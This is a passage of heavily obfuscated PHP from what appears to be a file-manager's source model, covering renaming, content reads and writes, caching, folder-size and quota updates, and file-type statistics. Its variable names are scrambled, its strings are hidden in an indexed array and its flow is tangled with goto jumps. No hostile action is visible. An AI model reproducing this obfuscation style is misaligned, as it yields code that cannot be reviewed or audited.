$EÛ¬êŞ¼[33], $EÛ¬êŞ¼[365]); $AÀ„“Í¾[] = $Cƒ ‘ÁğÓ®; } } else { $bÈöÂè…™º = array($bËŞ°Ş¥ï‹[$EÛ¬êŞ¼[415]]); $AÀ„“Í¾ = array($Cƒ ‘ÁğÓ®); } return array($EÛ¬êŞ¼[2323] => $AÀ„“Í¾, $EÛ¬êŞ¼[1245] => $bÈöÂè…™º); } public function removeArray($F’×¬¯¡œï) { if (!$F’×¬¯¡œï) { return !0; } } public function removeRelevance($CºÜÔóóá, $f®ÜÌÑÓ£Å) { goto bÀª˜ØÒê; c…ËƒÈŠ³Æ: for ($d õğ¸ßÜ = 0; $d õğ¸ßÜ < count($CºÜÔóóá); $d õğ¸ßÜ++) { $this->sourceCacheClear($CºÜÔóóá[$d õğ¸ßÜ]); } goto Bµ‰õ“æ¾Î; bÀª˜ØÒê: $cÛ›¯ä’›« =& $_SERVER[Ö¹ñÒÁ²÷]; $CºÜÔóóá = $CºÜÔóóá ? $CºÜÔóóá : array(); $f®ÜÌÑÓ£Å = $f®ÜÌÑÓ£Å ? $f®ÜÌÑÓ£Å : array(); goto F¥áÌ´í½Ü; f»“‚‘Ä­‘: Model($cÛ›¯ä’›«[2327])->where($aÅ•ì·Âíˆ)->delete(); Model($cÛ›¯ä’›«[501])->where($aÅ•ì·Âíˆ)->delete(); Model($cÛ›¯ä’›«[2056])->removeBySource($CºÜÔóóá); goto FÃ¡ºÅİÄï; F¥áÌ´í½Ü: $CºÜÔóóá = array_unique(array_filter($CºÜÔóóá)); $f®ÜÌÑÓ£Å = array_unique(array_filter($f®ÜÌÑÓ£Å)); if (!$CºÜÔóóá) { return !1; } goto C±£Ü‹Çö; C±£Ü‹Çö: $aÅ•ì·Âíˆ = array($cÛ›¯ä’›«[379] => array($cÛ›¯ä’›«[380], $CºÜÔóóá)); Model($cÛ›¯ä’›«[2324])->where($aÅ•ì·Âíˆ)->delete(); Model($cÛ›¯ä’›«[409])->where($aÅ•ì·Âíˆ)->delete(); goto f»“‚‘Ä­‘; FÃ¡ºÅİÄï: Model($cÛ›¯ä’›«[2305])->removeBySource($CºÜÔóóá); $this->where($aÅ•ì·Âíˆ)->delete(); Model($cÛ›¯ä’›«[418])->remove($f®ÜÌÑÓ£Å); goto c…ËƒÈŠ³Æ; Bµ‰õ“æ¾Î: } public function rename($cÊÄÂ¹˜ÑÍ, $BŒ‹ÁîÅ«) { goto e—ç´©‹ï˜; bå‚ˆ‘Œ‰·: $A»Ì¯Îèã = $this->fileNameExist($bÌİ§˜ôÙ›[$F†Œœîâ È[457]], $BŒ‹ÁîÅ«); if ($A»Ì¯Îèã) { return !1; } $Eë‰µ›©‚ = array($F†Œœîâ È[382] => $BŒ‹ÁîÅ«, $F†Œœîâ È[520] => USER_ID); goto b¹—É­¡˜ö; F³Öç‘å¹÷: $aîå†ˆ’† = $F†Œœîâ È[2313] . $bÌİ§˜ôÙ›[$F†Œœîâ È[457]]; if (isset(self::$cacheChildList[$aîå†ˆ’†])) { unset(self::$cacheChildList[$aîå†ˆ’†]); } return $f°¼ğÌæù‚; goto bÎÜØÛÁ¤»; b¹—É­¡˜ö: if (!$bÌİ§˜ôÙ›[$F†Œœîâ È[366]] == $F†Œœîâ È[83]) { $Eë‰µ›©‚[$F†Œœîâ È[368]] = get_path_ext($BŒ‹ÁîÅ«); } Model($F†Œœîâ È[501])->eventRename($cÊÄÂ¹˜ÑÍ, $bÌİ§˜ôÙ›[$F†Œœîâ È[28]], $BŒ‹ÁîÅ«); $this->sourceCacheClear($cÊÄÂ¹˜ÑÍ); goto F¦ğ¶éø¾ñ; F¦ğ¶éø¾ñ: $this->setNamePinyin($cÊÄÂ¹˜ÑÍ, $Eë‰µ›©‚[$F†Œœîâ È[28]], !1); $this->updateModifyTime($bÌİ§˜ôÙ›[$F†Œœîâ È[457]]); $f°¼ğÌæù‚ = $this->where(array($F†Œœîâ È[379] => $cÊÄÂ¹˜ÑÍ))->data($Eë‰µ›©‚)->save(); goto F³Öç‘å¹÷; e—ç´©‹ï˜: $F†Œœîâ È =& $_SERVER[Ö¹ñÒÁ²÷]; $bÌİ§˜ôÙ› = $this->sourceInfo($cÊÄÂ¹˜ÑÍ); if (!$bÌİ§˜ôÙ›) { return !1; } goto bå‚ˆ‘Œ‰·; bÎÜØÛÁ¤»: } public function setNamePinyin($AğŒÔˆ‚Ä, $C›ÒŠÕÀË¥, $AÛŠá«æ‹ = true) { $f¾÷Å‡‚—° =& $_SERVER[Ö¹ñÒÁ²÷]; $d˜¤÷äÆ¶› = Input::check($C›ÒŠÕÀË¥, $f¾÷Å‡‚—°[524]); if ($AÛŠá«æ‹ && !$d˜¤÷äÆ¶›) { return; } if (!$d˜¤÷äÆ¶›) { $this->metaSet($AğŒÔˆ‚Ä, $f¾÷Å‡‚—°[412], null); $this->metaSet($AğŒÔˆ‚Ä, $f¾÷Å‡‚—°[411], null); return; } $a¹÷ÒÉø—í = array($f¾÷Å‡‚—°[412] => str_replace($f¾÷Å‡‚—°[50], $f¾÷Å‡‚—°[33], Pinyin::encode($C›ÒŠÕÀË¥)), $f¾÷Å‡‚—°[411] => Pinyin::encode($C›ÒŠÕÀË¥, $f¾÷Å‡‚—°[525])); $this->metaSet($AğŒÔˆ‚Ä, $a¹÷ÒÉø—í); } public function getContent($B°Ç¡°ª÷×) { goto A›øˆõÎ²×; B‚‡‡‡öêê: if ($b›ƒèïõ°ì[$Ağ¯ÜÒÖÏ[77]] == 0) { return $Ağ¯ÜÒÖÏ[33]; } $FØÇĞÖ¨Ñ  = $Ağ¯ÜÒÖÏ[2328] . $b›ƒèïõ°ì[$Ağ¯ÜÒÖÏ[159]]; if ($b›ƒèïõ°ì[$Ağ¯ÜÒÖÏ[77]] <= 1024 * 10) { $dƒÚ¥ì¸Ó = Cache::get($FØÇĞÖ¨Ñ ); if (!$dƒÚ¥ì¸Ó) { $dƒÚ¥ì¸Ó = IO::getContent($b›ƒèïõ°ì[$Ağ¯ÜÒÖÏ[75]]); Cache::set($FØÇĞÖ¨Ñ , $dƒÚ¥ì¸Ó); } return $dƒÚ¥ì¸Ó; } goto C²ÙÑòñ§Í; C²ÙÑòñ§Í: return IO::getContent($b›ƒèïõ°ì[$Ağ¯ÜÒÖÏ[75]]); goto c‡×ê¶¢¶ğ; A›øˆõÎ²×: $Ağ¯ÜÒÖÏ =& $_SERVER[Ö¹ñÒÁ²÷]; $b›ƒèïõ°ì = $this->fileInfoGet($B°Ç¡°ª÷×); if (!$b›ƒèïõ°ì) { return !1; } goto B‚‡‡‡öêê; c‡×ê¶¢¶ğ: } public function setDesc($FŠ¾ĞÈ‚Ó¿, $Dğ‰Æğ …ä) { $Bé„»à³·› =& $_SERVER[Ö¹ñÒÁ²÷]; Model($Bé„»à³·›[501])->eventAddDesc($FŠ¾ĞÈ‚Ó¿, $Dğ‰Æğ …ä); return $this->metaSet($FŠ¾ĞÈ‚Ó¿, $Bé„»à³·›[401], $Dğ‰Æğ …ä); } public function setContent($b®Í˜À’Ã, $Ešº‚ƒÏ‡° = '') { goto c³Õ÷ƒİÌ¸; c³Õ÷ƒİÌ¸: $cƒÊÖ®ƒ½Ä =& $_SERVER[Ö¹ñÒÁ²÷]; $BŒÑÈÅœ‡¡ = $this->sourceInfo($b®Í˜À’Ã); $BÍÒóŸÁ•ì = $this->fileInfoGet($b®Í˜À’Ã); goto aĞÍÊ‰ŠÇˆ; aĞÍÊ‰ŠÇˆ: if (!$BÍÒóŸÁ•ì || !$BŒÑÈÅœ‡¡) { return !1; } $AŒªÄÅ…¨Ò = Model($cƒÊÖ®ƒ½Ä[418])->addFileByContent($Ešº‚ƒÏ‡°, $BŒÑÈÅœ‡¡[$cƒÊÖ®ƒ½Ä[28]]); $aÕ½çÂ‚‹ô = $this->fileHistory($BŒÑÈÅœ‡¡, $AŒªÄÅ…¨Ò[$cƒÊÖ®ƒ½Ä[415]], $AŒªÄÅ…¨Ò[$cƒÊÖ®ƒ½Ä[77]]); goto Eà»¼¯ƒÜ; Eà»¼¯ƒÜ: if (!$aÕ½çÂ‚‹ô) { return Model($cƒÊÖ®ƒ½Ä[418])->remove($AŒªÄÅ…¨Ò[$cƒÊÖ®ƒ½Ä[415]]); } $this->folderSizeReset($BŒÑÈÅœ‡¡[$cƒÊÖ®ƒ½Ä[457]]); return !0; goto c‚ÈõÊ‰Ï¼; c‚ÈõÊ‰Ï¼: } public function fileSubstr($f†Ù·ó¡å, $aæù‚ÌŒ‰ê, $cßÄ–¥º«) { $cŠÀëœÏ£ò = $this->fileInfoGet($f†Ù·ó¡å); if (!$cŠÀëœÏ£ò) { return !1; } return IO::fileSubstr($cŠÀëœÏ£ò[$_SERVER[Ö¹ñÒÁ²÷][75]], $aæù‚ÌŒ‰ê, $cßÄ–¥º«); } public function fileInfoGet($A¤­ãØ·öê) { goto C•ÛĞ¬İã; dñ¥‡â«İƒ: $Aç‡âï³ = $dÎì’š˜¥ƒ[421] . $C£®åÓ‡[$dÎì’š˜¥ƒ[415]]; $aªèÇ‘Î‚ = _get(self::$cacheFileInfo, $Aç‡âï³); if ($aªèÇ‘Î‚) { return $aªèÇ‘Î‚; } goto B—»ß”ñä¼; C•ÛĞ¬İã: $dÎì’š˜¥ƒ =& $_SERVER[Ö¹ñÒÁ²÷]; $C£®åÓ‡ = $this->sourceInfo($A¤­ãØ·öê); if (!$C£®åÓ‡ || $C£®åÓ‡[$dÎì’š˜¥ƒ[366]]) { return !1; } goto dñ¥‡â«İƒ; B—»ß”ñä¼: $f£„éä•Æ = Model($dÎì’š˜¥ƒ[418])->fileInfo($C£®åÓ‡[$dÎì’š˜¥ƒ[415]]); if ($f£„éä•Æ) { $f£„éä•Æ[$dÎì’š˜¥ƒ[28]] = $C£®åÓ‡[$dÎì’š˜¥ƒ[28]]; } self::$cacheFileInfo[$Aç‡âï³] = $f£„éä•Æ; goto Eä„×’‘™é; Eä„×’‘™é: return $f£„éä•Æ; goto dº˜£¥Óç; dº˜£¥Óç: } private function folderChildrenNumber($f¯Ùµ÷ÔŠ) { $dÕéĞã‘ =& $_SERVER[Ö¹ñÒÁ²÷]; $aĞ×Ì…õ® = $this->sourceInfo($f¯Ùµ÷ÔŠ); $ašó„±› = array($dÕéĞã‘[521] => array($dÕéĞã‘[479], $aĞ×Ì…õ®[$dÕéĞã‘[455]] . $f¯Ùµ÷ÔŠ . $dÕéĞã‘[480]), $dÕéĞã‘[392] => intval($aĞ×Ì…õ®[$dÕéĞã‘[393]]), $dÕéĞã‘[514] => 1); $Bí¼Ó·¿¦‚ = $this->where($ašó„±›)->count(); $cÍáÈ½ÅÜ = $this->where($ašó„±›)->where(array($dÕéĞã‘[514] => 0))->count(); return array($dÕéĞã‘[81] => $cÍáÈ½ÅÜ, $dÕéĞã‘[82] => $Bí¼Ó·¿¦‚); } public function pathInfo($E•ĞìŠ³Í, $dßÙî‰µØ = false) { goto e°ßˆĞìğç; F¯âäŸ¸çù: if ($DÄ¦·ìœë·) { return $DÄ¦·ìœë·; } $fÓ»ÓìË‘Ó = $this->sourceInfo($E•ĞìŠ³Í); if (!$fÓ»ÓìË‘Ó) { return !1; } goto F¼â ½˜®Ô; F¼â ½˜®Ô: $fÓ»ÓìË‘Ó = $this->_listDataApplyItem($fÓ»ÓìË‘Ó, $dßÙî‰µØ); self::$cachePathInfo[$cÜ¸éŸáÓ§] = $fÓ»ÓìË‘Ó; return $fÓ»ÓìË‘Ó; goto f³æí°Ã”Ù; e°ßˆĞìğç: $d÷¸ÕÔÜƒÖ =& $_SERVER[Ö¹ñÒÁ²÷]; $cÜ¸éŸáÓ§ = $d÷¸ÕÔÜƒÖ[407] . intval($dßÙî‰µØ) . $d÷¸ÕÔÜƒÖ[408] . $E•ĞìŠ³Í; $DÄ¦·ìœë· = _get(self::$cachePathInfo, $cÜ¸éŸáÓ§); goto F¯âäŸ¸çù; f³æí°Ã”Ù: } public static $cachePathInfoMore = array(); public function pathInfoMore($f‹ÙŸåñ‡Ô) { goto aÆã÷©•õÍ; c¬ÇÖË‰¨ğ: $A©›½Éˆ÷« = $this->pathInfo($f‹ÙŸåñ‡Ô); if (!$A©›½Éˆ÷«) { return !1; } if ($A©›½Éˆ÷«[$f¼®Ëñ¸â[366]] == $f¼®Ëñ¸â[83]) { $A©›½Éˆ÷«[$f¼®Ëñ¸â[80]] = $this->folderChildrenNumber($f‹ÙŸåñ‡Ô); } goto F‰İ¶¶êŸ; F‰İ¶¶êŸ: self::$cachePathInfoMore[$f‹ÙŸåñ‡Ô] = $A©›½Éˆ÷«; return $A©›½Éˆ÷«; goto E–ùõë; aÆã÷©•õÍ: $f¼®Ëñ¸â =& $_SERVER[Ö¹ñÒÁ²÷]; $Dé¬Ö±ŞˆÇ = _get(self::$cachePathInfoMore, $f‹ÙŸåñ‡Ô); if ($Dé¬Ö±ŞˆÇ) { return $Dé¬Ö±ŞˆÇ; } goto c¬ÇÖË‰¨ğ; E–ùõë: } public function sourceInfo($f¿ãÑ—óÇç) { goto CÚ‹­íÎÕ; c£¬˜Ñ Ø‰: $fÇ£ô˜ˆ² = _get(self::$cacheSourceInfo, $DùéÎ“Ï·); if ($fÇ£ô˜ˆ²) { return $fÇ£ô˜ˆ²; } $aƒˆ¸ğ ›¤ = $this->where(array($FÒë İù[365] => $f¿ãÑ—óÇç))->find(); goto dĞëò¼×¥Œ; dĞëò¼×¥Œ: self::$cacheSourceInfo[$DùéÎ“Ï·] = $aƒˆ¸ğ ›¤; return self::$cacheSourceInfo[$DùéÎ“Ï·]; goto cšÊŠ”ƒ¿; CÚ‹­íÎÕ: $FÒë İù =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$f¿ãÑ—óÇç) { return array(); } $DùéÎ“Ï· = $FÒë İù[406] . $f¿ãÑ—óÇç; goto c£¬˜Ñ Ø‰; cšÊŠ”ƒ¿: } public function sourceCacheClear($aÎ÷ÔÔ” = false) { if ($aÎ÷ÔÔ” == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[Ö¹ñÒÁ²÷][406] . $aÎ÷ÔÔ”]); } public function pathInfoByPath($e¯ã„—ñŞç, $BÕà›²Ì) { $F´Ÿ”ËÃÅï =& $_SERVER[Ö¹ñÒÁ²÷]; $AËì²ãî²Ÿ = !$BÕà›²Ì ? array() : explode($F´Ÿ”ËÃÅï[8], trim($BÕà›²Ì, $F´Ÿ”ËÃÅï[8])); $Cœ­ºß©Ø = $e¯ã„—ñŞç; foreach ($AËì²ãî²Ÿ as $f‘¤‘ÉµŸ) { $cÓÑ¼¾ó¡ = array($F´Ÿ”ËÃÅï[457] => $Cœ­ºß©Ø, $F´Ÿ”ËÃÅï[28] => $f‘¤‘ÉµŸ); $c…Ãµ÷„›Í = $this->where($cÓÑ¼¾ó¡)->select(); if (!$c…Ãµ÷„›Í) { return !1; } $c…Ãµ÷„›Í = array_sort_by($c…Ãµ÷„›Í, $F´Ÿ”ËÃÅï[393]); $Cœ­ºß©Ø = $c…Ãµ÷„›Í[0][$F´Ÿ”ËÃÅï[365]]; } return $this->pathInfo($Cœ­ºß©Ø, !0); } protected function updateModifyTime($a®Ø¾‘‡Ë) { goto C¬òõ™—Í¹; fäÕ×ì§ËÍ: $this->where($dïïÕ³èÌÚ)->save($D¿Ü¶öĞĞ); goto c¿Î£ëÄ‹; C¬òõ™—Í¹: $B«»ÛÂØ—… =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$a®Ø¾‘‡Ë) { return; } if (!is_array($a®Ø¾‘‡Ë)) { $a®Ø¾‘‡Ë = array($a®Ø¾‘‡Ë); } goto F’¿Ş…õ…‰; F’¿Ş…õ…‰: foreach ($a®Ø¾‘‡Ë as $eóù›»ïèæ => $aæÄ´¾êš) { $a®Ø¾‘‡Ë[$eóù›»ïèæ] = intval($aæÄ´¾êš); } $dïïÕ³èÌÚ = array($B«»ÛÂØ—…[365] => array($B«»ÛÂØ—…[7], $a®Ø¾‘‡Ë)); $D¿Ü¶öĞĞ = array($B«»ÛÂØ—…[520] => USER_ID, $B«»ÛÂØ—…[386] => time()); goto fäÕ×ì§ËÍ; c¿Î£ëÄ‹: } public function folderSizeReset($e‹Õî…ë”¹) { goto eé¦¡†Ü‡; eÅğÑÀ‚ƒ: $cÓñ‰‰¼ = $this->parentLevelArray($cˆÅÌ¡èõƒ[$Aì”›áå²[455]]); if ($cÓñ‰‰¼) { $c½™ÖàÙÁ… = array($Aì”›áå²[365] => array($Aì”›áå²[380], $cÓñ‰‰¼)); if ($Eé‡¿öâñ± < 0) { $c½™ÖàÙÁ…[$Aì”›áå²[77]] = array($Aì”›áå²[925], abs($Eé‡¿öâñ±)); } $this->where($c½™ÖàÙÁ…)->setAdd($Aì”›áå²[77], $Eé‡¿öâñ±); } $this->targetSpaceUpdate($cˆÅÌ¡èõƒ[$Aì”›áå²[367]], $cˆÅÌ¡èõƒ[$Aì”›áå²[452]]); goto e’›ŸĞâ; FÄ‘éì¼¼: $Eé‡¿öâñ± = $a¢Œ¦ê ´Ì - intval($cˆÅÌ¡èõƒ[$Aì”›áå²[77]]); if ($Eé‡¿öâñ± == 0) { return CacheLock::unlock($a‘’ˆŸõ’); } $this->where(array($Aì”›áå²[379] => $e‹Õî…ë”¹))->setField($Aì”›áå²[77], $a¢Œ¦ê ´Ì); goto eÅğÑÀ‚ƒ; C”¨Ü¡‡›: CacheLock::lock($a‘’ˆŸõ’, 20); $this->sourceCacheClear($e‹Õî…ë”¹); $cˆÅÌ¡èõƒ = $this->sourceInfo($e‹Õî…ë”¹); goto a‘¸Ú™’ˆ; e’›ŸĞâ: CacheLock::unlock($a‘’ˆŸõ’); goto FÕ‰ñ®Ÿ‚ö; eé¦¡†Ü‡: $Aì”›áå² =& $_SERVER[Ö¹ñÒÁ²÷]; if ($this->statusIgnoreResetSpace) { return; } $a‘’ˆŸõ’ = $Aì”›áå²[2329] . $e‹Õî…ë”¹; goto C”¨Ü¡‡›; a‘¸Ú™’ˆ: $c½™ÖàÙÁ… = array($Aì”›áå²[364] => $e‹Õî…ë”¹, $Aì”›áå²[392] => 0); $a¢Œ¦ê ´Ì = $this->where($c½™ÖàÙÁ…)->sum($Aì”›áå²[77]); $a¢Œ¦ê ´Ì = intval($a¢Œ¦ê ´Ì); goto FÄ‘éì¼¼; FÕ‰ñ®Ÿ‚ö: } public function folderSizeResetChildren($fÃĞ¨¢ºëØ) { goto CÆ‘Ô¯©”; bòØè¶‰Ûò: $E¢ì‡™Û = array($b±µÈ‚îˆ÷[514] => 1, $b±µÈ‚îˆ÷[521] => array($b±µÈ‚îˆ÷[479], $D³ø‰Ù¹–³[$b±µÈ‚îˆ÷[455]] . $fÃĞ¨¢ºëØ . $b±µÈ‚îˆ÷[480])); $dÈ¸æ³Äõí = $b±µÈ‚îˆ÷[2330]; $Fß“Ê…”ëŒ = $this->field($dÈ¸æ³Äõí)->where($E¢ì‡™Û)->select(); goto bÛ÷Ğ ÁóË; bÛ÷Ğ ÁóË: $E¢ì‡™Û[$b±µÈ‚îˆ÷[366]] = 0; $fçÍ½‰ğó÷ = $this->field($dÈ¸æ³Äõí)->where($E¢ì‡™Û)->select(); if (!$fçÍ½‰ğó÷) { return; } goto e»ÁùâÄø¦; e»ÁùâÄø¦: $Fß“Ê…”ëŒ[] = $D³ø‰Ù¹–³; $Fß“Ê…”ëŒ = array_to_keyvalue($Fß“Ê…”ëŒ, $b±µÈ‚îˆ÷[365]); foreach ($Fß“Ê…”ëŒ as $cº¹øñ ºØ => $c©ñ»é©è) { $Fß“Ê…”ëŒ[$cº¹øñ ºØ][$b±µÈ‚îˆ÷[2331]] = $Fß“Ê…”ëŒ[$cº¹øñ ºØ][$b±µÈ‚îˆ÷[77]]; $Fß“Ê…”ëŒ[$cº¹øñ ºØ][$b±µÈ‚îˆ÷[77]] = 0; } goto b¿Œ‚¾ØƒÛ; CÆ‘Ô¯©”: $b±µÈ‚îˆ÷ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->sourceCacheClear($fÃĞ¨¢ºëØ); $D³ø‰Ù¹–³ = $this->sourceInfo($fÃĞ¨¢ºëØ); goto bòØè¶‰Ûò; b¿Œ‚¾ØƒÛ: foreach ($fçÍ½‰ğó÷ as $c©ñ»é©è) { $B¤ ¬¿ò‹Ñ = $c©ñ»é©è[$b±µÈ‚îˆ÷[457]] . $b±µÈ‚îˆ÷[33]; if (!isset($Fß“Ê…”ëŒ[$B¤ ¬¿ò‹Ñ])) { continue; } if ($c©ñ»é©è[$b±µÈ‚îˆ÷[393]] == $Fß“Ê…”ëŒ[$B¤ ¬¿ò‹Ñ][$b±µÈ‚îˆ÷[393]]) { $Fß“Ê…”ëŒ[$B¤ ¬¿ò‹Ñ][$b±µÈ‚îˆ÷[77]] += $c©ñ»é©è[$b±µÈ‚îˆ÷[77]]; } } foreach ($Fß“Ê…”ëŒ as $c©ñ»é©è) { $C‘¿ŠÉ§£¡ = $this->parentLevelArray($c©ñ»é©è[$b±µÈ‚îˆ÷[455]]); foreach ($C‘¿ŠÉ§£¡ as $B¤ ¬¿ò‹Ñ) { $B¤ ¬¿ò‹Ñ = $B¤ ¬¿ò‹Ñ . $b±µÈ‚îˆ÷[33]; if (!isset($Fß“Ê…”ëŒ[$B¤ ¬¿ò‹Ñ])) { continue; } if ($c©ñ»é©è[$b±µÈ‚îˆ÷[393]] == $Fß“Ê…”ëŒ[$B¤ ¬¿ò‹Ñ][$b±µÈ‚îˆ÷[393]]) { $Fß“Ê…”ëŒ[$B¤ ¬¿ò‹Ñ][$b±µÈ‚îˆ÷[77]] += $c©ñ»é©è[$b±µÈ‚îˆ÷[77]]; } } } $f…©Âœ¾Ë = array(); goto E‹Ëå“ïÎÒ; E‹Ëå“ïÎÒ: foreach ($Fß“Ê…”ëŒ as $c©ñ»é©è) { if ($c©ñ»é©è[$b±µÈ‚îˆ÷[77]] == $c©ñ»é©è[$b±µÈ‚îˆ÷[2331]]) { continue; } $f…©Âœ¾Ë[] = array($b±µÈ‚îˆ÷[365], $c©ñ»é©è[$b±µÈ‚îˆ÷[365]], $b±µÈ‚îˆ÷[77], $c©ñ»é©è[$b±µÈ‚îˆ÷[77]]); } $this->saveAll($f…©Âœ¾Ë); goto BËŸ¦Û¸­Ú; BËŸ¦Û¸­Ú: } public function userSpaceReset($dÌÏãóµ³Õ = false) { $FÁ•Ù×áä =& $_SERVER[Ö¹ñÒÁ²÷]; $FÕï…ø¾Ö = $this->where(array($FÁ•Ù×áä[367] => self::TYPE_USER, $FÁ•Ù×áä[452] => $dÌÏãóµ³Õ, $FÁ•Ù×áä[366] => 0))->sum($FÁ•Ù×áä[77]); Model($FÁ•Ù×áä[470])->userEdit($dÌÏãóµ³Õ, array($FÁ•Ù×áä[2065] => $FÕï…ø¾Ö)); } public function targetSpaceUpdate($E™È©÷´œÁ, $BĞ–Ûùùò…) { $aÀ®Ü³“¯Ü =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$BĞ–Ûùùò…) { return; } if (!in_array($E™È©÷´œÁ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $bÕŸŸ‘ï° = $this->targetSpaceSize($E™È©÷´œÁ, $BĞ–Ûùùò…); if ($E™È©÷´œÁ == self::TYPE_USER) { Model($aÀ®Ü³“¯Ü[470])->userEdit($BĞ–Ûùùò…, array($aÀ®Ü³“¯Ü[2065] => $bÕŸŸ‘ï°)); } else { if ($E™È©÷´œÁ == self::TYPE_GROUP) { Model($aÀ®Ü³“¯Ü[454])->groupEdit($BĞ–Ûùùò…, array($aÀ®Ü³“¯Ü[2065] => $bÕŸŸ‘ï°)); } } } public function targetSpaceSize($fĞÇÎ…Òá, $EÉ¢¢ôá¢é) { goto DñĞ…äÄöÎ; AŠ‹„Æ¼ˆæ: $AŞÈ§ƒ’Ïó = floatval($Fñ«É¥†ñ[$aôÇÈˆ«œã[77]]); $d®¿µä‹‰î = array($aôÇÈˆ«œã[521] => array($aôÇÈˆ«œã[479], $aôÇÈˆ«œã[466] . $Fñ«É¥†ñ[$aôÇÈˆ«œã[365]] . $aôÇÈˆ«œã[480])); $b°ÖßÂ½®İ = Model($aôÇÈˆ«œã[391])->field($aôÇÈˆ«œã[379])->where($d®¿µä‹‰î)->select(); goto EŠÏíŒ¦™æ; DñĞ…äÄöÎ: $aôÇÈˆ«œã =& $_SERVER[Ö¹ñÒÁ²÷]; $Fñ«É¥†ñ = $this->sourceRoot($fĞÇÎ…Òá, $EÉ¢¢ôá¢é, !0); if (!$Fñ«É¥†ñ) { return 0; } goto AŠ‹„Æ¼ˆæ; EŠÏíŒ¦™æ: $b°ÖßÂ½®İ = array_to_keyvalue($b°ÖßÂ½®İ, $aôÇÈˆ«œã[33], $aôÇÈˆ«œã[365]); $b°ÖßÂ½®İ = array_unique(array_filter($b°ÖßÂ½®İ)); if ($b°ÖßÂ½®İ) { $d®¿µä‹‰î = array($aôÇÈˆ«œã[379] => array($aôÇÈˆ«œã[380], $b°ÖßÂ½®İ)); $AŞÈ§ƒ’Ïó += floatval($this->where($d®¿µä‹‰î)->sum($aôÇÈˆ«œã[77])); } goto DïËÄ‚ãòÉ; DïËÄ‚ãòÉ: return $AŞÈ§ƒ’Ïó; goto E»Ó§±ŸÌ; E»Ó§±ŸÌ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($F§õ…ŸŞ¶») { return $this->fileTypeProfile($F§õ…ŸŞ¶», SourceModel::TYPE_USER); } public function groupFileTypeProfile($d İ‹ËŸôÕ) { return $this->fileTypeProfile($d İ‹ËŸôÕ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($C¶¤İ×¶‡Ÿ, $a›ÉÚ¢ëïƒ) { goto aÇŒ§ÛãÓ; BÒâÆ´ÊŞÃ: if ($EìÚƒì¹¹) { return $EìÚƒì¹¹; } $FÜğˆ¡ÈˆÏ = array($a³“¢¬íÕ˜[514] => 0); if ($C¶¤İ×¶‡Ÿ != !1) { $FÜğˆ¡ÈˆÏ[$a³“¢¬íÕ˜[452]] = $C¶¤İ×¶‡Ÿ; $FÜğˆ¡ÈˆÏ[$a³“¢¬íÕ˜[367]] = $a›ÉÚ¢ëïƒ; } goto dêæÚòŒ¯ì; aÇŒ§ÛãÓ: $a³“¢¬íÕ˜ =& $_SERVER[Ö¹ñÒÁ²÷]; $bå»ÀÀ©½Ÿ = $a³“¢¬íÕ˜[2332] . $C¶¤İ×¶‡Ÿ . $a³“¢¬íÕ˜[70] . $a›ÉÚ¢ëïƒ; $EìÚƒì¹¹ = Cache::get($bå»ÀÀ©½Ÿ); goto BÒâÆ´ÊŞÃ; e´ëæÄ™Î»: foreach ($fœİ’‹‘©ñ as $dÉàšÇ¥®Ö => $cìÌÃæí÷¯) { $FÜğˆ¡ÈˆÏ[$a³“¢¬íÕ˜[368]] = $this->fileTypeWhere($dÉàšÇ¥®Ö); $A‰Â‹Ä„¼ [$dÉàšÇ¥®Ö] = array($a³“¢¬íÕ˜[2334] => $cìÌÃæí÷¯[$a³“¢¬íÕ˜[28]], $a³“¢¬íÕ˜[2335] => $this->where($FÜğˆ¡ÈˆÏ)->count(), $a³“¢¬íÕ˜[516] => $this->where($FÜğˆ¡ÈˆÏ)->sum($a³“¢¬íÕ˜[77])); } Cache::set($bå»ÀÀ©½Ÿ, $A‰Â‹Ä„¼ , 1200); return $A‰Â‹Ä„¼ ; goto B¥Ş†Œ¢’; dêæÚòŒ¯ì: $A‰Â‹Ä„¼  = array(); $A‰Â‹Ä„¼ [$a³“¢¬íÕ˜[2333]] = array($a³“¢¬íÕ˜[2334] => LNG($a³“¢¬íÕ˜[2333]), $a³“¢¬íÕ˜[2335] => $this->where($FÜğˆ¡ÈˆÏ)->count(), $a³“¢¬íÕ˜[516] => $this->where($FÜğˆ¡ÈˆÏ)->sum($a³“¢¬íÕ˜[77])); $fœİ’‹‘©ñ = KodIO::fileTypeList(); goto e´ëæÄ™Î»; B¥Ş†Œ¢’: } public function fileNameExist($BåòªÊÖ—ä, $cñ’¢²®µŞ) { $DŸÓ¹§ÈÕ— =& $_SERVER[Ö¹ñÒÁ²÷]; $D¯ìƒÅŒ‡Â = $this->childList($BåòªÊÖ—ä); foreach ($D¯ìƒÅŒ‡Â as $bº¨…Å†Îõ) { if ($bº¨…Å†Îõ[$DŸÓ¹§ÈÕ—[28]] == $cñ’¢²®µŞ) { return $bº¨…Å†Îõ[$DŸÓ¹§ÈÕ—[365]]; } } return !1; } public function childList($b™›×¼¦) { goto bĞ§ä‹£­Ñ; bİ‰ŒÊÑìò: $Céì±ÎĞÓà = array($cÄî¦ëìá‡[457] => intval($b™›×¼¦), $cÄî¦ëìá‡[393] => 0); $DàÍğ™¬Û = $this->where($Céì±ÎĞÓà)->select(); $DàÍğ™¬Û = $DàÍğ™¬Û ? $DàÍğ™¬Û : array(); goto D¡¼ç™«½å; D¡¼ç™«½å: self::$cacheChildList[$EÇÁÚ›ò…Š] = $DàÍğ™¬Û; foreach ($DàÍğ™¬Û as $BÙ·°àğ¯Ê) { $EÇÁÚ›ò…Š = $cÄî¦ëìá‡[406] . $BÙ·°àğ¯Ê[$cÄî¦ëìá‡[365]]; self::$cacheSourceInfo[$EÇÁÚ›ò…Š] = $BÙ·°àğ¯Ê; } return $DàÍğ™¬Û; goto dÑŠÅ÷ÈŠê; bĞ§ä‹£­Ñ: $cÄî¦ëìá‡ =& $_SERVER[Ö¹ñÒÁ²÷]; $EÇÁÚ›ò…Š = $cÄî¦ëìá‡[2313] . $b™›×¼¦; if (isset(self::$cacheChildList[$EÇÁÚ›ò…Š])) { return 